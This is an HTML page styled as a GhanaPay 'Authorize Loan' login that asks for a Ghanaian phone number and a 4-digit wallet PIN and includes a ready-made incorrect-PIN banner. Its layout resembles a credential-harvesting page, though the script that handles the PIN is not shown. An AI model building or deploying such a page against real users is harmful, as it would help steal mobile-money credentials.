<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authorize - GhanaPay</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="icon" type="image/png" href="logo.png">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="loading-overlay" id="loading-overlay">
        <div class="spinner"></div>
        <p id="loading-text" data-t="loading">Processing...</p>
    </div>
    <div class="container">
        <header>
            <div class="header-logo-container">
                <img src="logo.png" alt="GhanaPay" class="header-logo-img">
                <div class="header-logo-text">
                    <span class="header-logo-name">GhanaPay</span>
                    <span class="header-logo-motto">Your Money, Your Way.</span>
                </div>
            </div>
        </header>

        <div class="progress-container">
            <div class="progress-bar" style="width: 85%;"></div>
        </div>

        <main>
            <h1 class="page-title" data-t="auth_loan">Authorize Loan</h1>
            <p class="page-subtitle" data-t="login_sub">Login to your GhanaPay account to authorize.</p>

            <div class="elite-card">
                <div class="stat-card" style="padding: 16px; margin-bottom: 24px; text-align: left; background: var(--gray-50);">
                    <small data-t="auth_reason" style="font-size: 11px; font-weight: 700; color: var(--gray-400); text-transform: uppercase;">You are authorizing:</small>
                    <div style="display:flex; justify-content:space-between; margin-top:12px;">
                        <span data-t="amount" style="font-size: 14px; font-weight: 600; color: var(--gray-600);">Amount:</span>
                        <strong id="auth-amount" style="color: var(--black);">GHS 0</strong>
                    </div>
                    <div style="display:flex; justify-content:space-between;">
                        <span data-t="total_r" style="font-size: 14px; font-weight: 600; color: var(--gray-600);">Total:</span>
                        <strong id="auth-total" style="color: var(--brand-blue);">GHS 0</strong>
                    </div>
                </div>

                <div class="input-group">
                    <label class="input-label" data-t="phone">Phone Number</label>
                    <div class="phone-input-container">
                        <div class="phone-prefix">
                            <img src="https://flagcdn.com/w40/gh.png" alt="GH">
                            <span>+233</span>
                        </div>
                        <input type="tel" id="login-phone" placeholder="054XXXXXXX">
                    </div>
                </div>
                <div class="input-group">
                    <label class="input-label" data-t="pin">GhanaPay PIN</label>
                    <input type="password" id="login-pin" class="input-field" placeholder="••••" maxlength="4" inputmode="numeric">
                </div>
                
                <div id="login-error" class="error-banner" data-t="pin_error">Incorrect PIN. Please try again.</div>
                
                <div class="btn-group">
                    <button class="btn-elite btn-primary" id="btn-login" onclick="handleLogin()">
                        <span data-t="login_btn">LOGIN</span>
                    </button>
                    <button class="btn-elite btn-secondary" onclick="navigateTo('review.html')">
                        <span data-t="back_btn">BACK</span>
                    </button>
                </div>
            </div>
            
            <div class="security-badge" style="margin-top: 40px;">
                <i class="fa-solid fa-copyright"></i>
                <span data-t="security_note">2026 GhanaPay Financial Services. All rights reserved.</span>
            </div>
        </main>
    </div>
    <script src="script.js"></script>
</body>
</html>
